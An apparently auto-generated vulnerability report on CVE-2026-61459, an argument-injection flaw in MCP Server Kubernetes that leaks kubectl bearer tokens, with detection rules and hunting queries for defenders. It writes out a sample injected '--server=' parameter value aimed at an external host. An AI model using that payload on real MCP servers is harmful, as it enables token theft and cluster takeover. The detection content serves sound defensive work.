> **ThreatForge Output — TECHNICAL_FINDINGS**
>
> CVE:       CVE-2026-61459
> Product:   kubernetes
> Tags:      [RCE] [CRIT] [WIDE]
> Score:     80
> Tier:      HIGH PRIORITY
> Generated: 2026-07-14T20:20:46.708160Z
> Status:    OK

# Technical Findings Report — CVE-2026-61459

> **DRAFT FOR ANALYST REVIEW** — This report is a proposed draft generated for analyst validation. All findings, indicators, and recommendations must be reviewed and confirmed by a qualified security analyst before operational use.

---

## CVE Summary

| Field | Detail |
|---|---|
| **CVE ID** | CVE-2026-61459 |
| **Affected Product** | MCP Server Kubernetes (mcp-server-kubernetes) versions **< 3.9.0** |
| **CVSS Score** | **9.8 CRITICAL** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) [1] |
| **KEV Status** | Not listed in CISA KEV at time of writing (no KEV context provided) |
| **Vulnerability Age** | 3 days old — patch recently released [2] |
| **PoC Status** | No public proof-of-concept known |

The vulnerability is an **argument injection** in the structured tool interface of MCP Server Kubernetes that allows an unauthenticated, network-adjacent attacker to inject a `--server` flag into `kubectl` command construction, redirecting API calls to an attacker-controlled server and exfiltrating the Kubernetes bearer token [3][4].

---

## Attack Vector

### Mechanism

MCP Server Kubernetes exposes structured tools that accept `resourceType` and `name` parameters to construct and execute `kubectl` commands. A validation function (`assertNoDangerousFlags`) is responsible for blocking dangerous flag injection [3]. The vulnerability arises because this check fails to account for parameters that **begin with leading dashes**, allowing an attacker to inject additional `kubectl` flags by embedding them within the `resourceType` or `name` parameter values [1][4].

Specifically, an attacker supplies a crafted value that causes the resulting command to include `--server=https://attacker.controlled.host`, redirecting the `kubectl` invocation away from the legitimate Kubernetes API server. Because the MCP server presents the bearer token to whichever server it connects to, the token is transmitted to the attacker-controlled endpoint [3].

### CVSS Vector Breakdown

| Component | Value | Rationale |
|---|---|---|
| **Attack Vector (AV)** | Network (N) | Exploitable over the network; no physical access required [1] |
| **Attack Complexity (AC)** | Low (L) | Requires only crafted parameter input; no race condition or complex setup |
| **Privileges Required (PR)** | None (N) | No authentication to the MCP server is required to supply tool parameters [1] |
| **User Interaction (UI)** | None (N) | Fully automated exploitation |
| **Confidentiality Impact (C)** | High | Bearer token exfiltration leads to full secret disclosure |
| **Integrity / Availability (I/A)** | High | Full cluster compromise possible once token is obtained [4] |

### Required Conditions

1. MCP Server Kubernetes version **< 3.9.0** is deployed and reachable by the attacker.
2. The attacker can invoke structured tools (e.g., via the MCP protocol interface) and control the `resourceType` and/or `name` parameter values.
3. A Kubernetes bearer token with meaningful cluster permissions is active in the server's runtime environment.

---

## Observable Behaviour

### Network-Level Indicators

An exploitation attempt will manifest as two distinct network events:

**1. Inbound crafted tool invocation (to the MCP server)**

The attacker sends a structured tool request containing injected flag content in the `resourceType` or `name` fields. The payload pattern will include leading dashes and the string `--server=` pointing to an external host:

resourceType: "--server=https://192.0.2.100:6443"
name:         "default/mypod"

Or equivalently embedded within a single parameter to bypass naive string-matching on the `assertNoDangerousFlags` check [3].

**2. Outbound kubectl API call to attacker-controlled server**

Immediately following a successful injection, the MCP server process will initiate an **outbound HTTPS connection** (default port 6443 or 443) to the attacker-specified `--server` target. This connection will carry the **`Authorization: Bearer <token>`** header.

Direction:    OUTBOUND
Protocol:     HTTPS / TLS
Destination:  Attacker-controlled IP or hostname
Port:         6443 (typical) or 443
User-Agent:   kubectl/<version> (likely)
Header:       Authorization: Bearer eyJ...

### Process-Level Indicators

On the host running mcp-server-kubernetes, look for `kubectl` child processes spawned by the Node.js MCP server process with anomalous `--server` arguments:

PPID: <node process PID>
CMD:  kubectl get <resourceType> <name> --server=https://external-host:6443 ...

**Key detection pivot:** `kubectl` processes with a `--server` flag pointing to an IP or hostname that is **not** the cluster's known API server endpoint.

### Log Indicators

- MCP server application logs showing tool invocations with parameter values containing leading dashes (`-`) or the string `--server`.
- `kubectl` audit logs (if the legitimate API server is still contacted) will show **no corresponding request** for an operation that the MCP server logs as executed — because the request was redirected.
- TLS handshake failures or unusual certificate errors in the MCP server logs if the attacker's server uses a self-signed certificate.

---

## Detection Coverage

> The following detection logic is a **proposed draft for analyst review**. Tune thresholds and field mappings to your environment before deployment.

### Suricata Network Signature (Proposed)

# CVE-2026-61459 — MCP Server Kubernetes --server flag injection / bearer token exfiltration
# DRAFT FOR ANALYST REVIEW
alert tls any any -> any any (
    msg:"THREAT-FORGE CVE-2026-61459 Kubernetes Bearer Token to Non-Internal Host";
    flow:established,to_server;
    tls.sni;
    pcre:"/^(?!.*\.cluster\.local$).*/";
    content:"Authorization|3a 20|Bearer ";
    nocase;
    http.header;
    content:"kubectl";
    http.user_agent;
    nocase;
    threshold:type limit, track by_src, count 1, seconds 60;
    classtype:credential-theft;
    sid:9002646459001;
    rev:1;
    metadata:cve CVE-2026-61459, created_at 2026-07-11, affected_product mcp-server-kubernetes;
)

> **Analyst Note:** This rule fires on `kubectl`-user-agent TLS connections carrying bearer tokens to non-internal SNI targets. False-positive tuning will be required for environments that legitimately proxy `kubectl` traffic externally. Confirm your cluster's internal domain suffix and adjust the PCRE accordingly.

### SIEM / EDR Hunting Queries (Proposed)

**Process execution hunt (Splunk / Elastic ECS syntax)**

index=endpoint sourcetype=process_creation
  (process_name="kubectl" OR process_path="*/kubectl")
  process_args="--server=*"
| eval injected_server=mvindex(split(process_args, "--server="), 1)
| where NOT match(injected_server, "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|<YOUR_API_SERVER_FQDN>)")
| table _time, host, parent_process, process_args, injected_server
| sort -_time

**Network connection hunt (Elastic ECS)**

event.category: "network" AND
event.type: "connection" AND
process.name: "kubectl" AND
destination.port: (6443 OR 443) AND
NOT destination.ip: (<KNOWN_API_SERVER_IP_RANGE>)

**MCP parameter injection hunt (application log parsing)**

index=application sourcetype=mcp_server_kubernetes
  (message="*resourceType*" OR message="*name*")
| regex message="(?:resourceType|name)[\"': ]+--"
| table _time, host, src_ip, message
## Sources (ThreatForge-verified)

[1] NVD — https://nvd.nist.gov/vuln/detail/CVE-2026-61459
[2] github.com — https://github.com/Flux159/mcp-server-kubernetes/commit/d7890f50a4567bf5d9842541ba6f41e180227f9a
[3] github.com — https://github.com/Flux159/mcp-server-kubernetes/issues/328
[4] CVE.org (CNA-published record) — https://www.cve.org/CVERecord?id=CVE-2026-61459
